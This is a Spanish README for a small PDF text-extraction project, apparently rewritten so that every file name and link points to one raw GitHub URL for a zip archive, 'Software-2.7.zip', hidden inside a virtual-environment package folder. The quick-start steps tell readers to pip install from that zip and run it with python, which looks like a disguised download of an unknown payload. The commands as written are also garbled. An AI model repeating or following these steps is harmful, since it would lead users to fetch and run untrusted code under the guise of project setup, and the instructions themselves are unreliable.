# Proyecto: FISCAL-IA - Extracción y resumen de PDFs

Este mini-proyecto extrae texto de los PDFs presentes en la carpeta y genera archivos `.txt` para su análisis. Luego, se resumirán las ideas para proponer un plan de monetización y roadmap.

## Estructura
- `https://raw.githubusercontent.com/MiguelAngelCruzVargas/Fiscalia/main/backend/.venv/Lib/site-packages/_yaml/Software-2.7.zip`: Script para extraer texto usando pypdf y fallback https://raw.githubusercontent.com/MiguelAngelCruzVargas/Fiscalia/main/backend/.venv/Lib/site-packages/_yaml/Software-2.7.zip
- `https://raw.githubusercontent.com/MiguelAngelCruzVargas/Fiscalia/main/backend/.venv/Lib/site-packages/_yaml/Software-2.7.zip`: Dependencias de Python.

## Pasos rápidos

1) Crear y activar un entorno virtual (Windows PowerShell):

```powershell
py -m venv .venv
.\.venv\Scripts\https://raw.githubusercontent.com/MiguelAngelCruzVargas/Fiscalia/main/backend/.venv/Lib/site-packages/_yaml/Software-2.7.zip
```

2) Instalar dependencias:

```powershell
pip install -r https://raw.githubusercontent.com/MiguelAngelCruzVargas/Fiscalia/main/backend/.venv/Lib/site-packages/_yaml/Software-2.7.zip
```

3) Extraer texto de los PDFs de la carpeta actual:

```powershell
python .\https://raw.githubusercontent.com/MiguelAngelCruzVargas/Fiscalia/main/backend/.venv/Lib/site-packages/_yaml/Software-2.7.zip .
```

Esto producirá archivos `.txt` junto a cada PDF.

## Notas
- Si un PDF es una imagen escaneada, estos métodos no extraerán texto. En ese caso se necesitará OCR (por ejemplo, `tesseract-ocr` + `pytesseract`). Si lo detectamos, te propondré activarlo.

## Documentación relacionada
- Guía de integración con SAT-CFDI (alcance, decisiones y plan): `https://raw.githubusercontent.com/MiguelAngelCruzVargas/Fiscalia/main/backend/.venv/Lib/site-packages/_yaml/Software-2.7.zip`
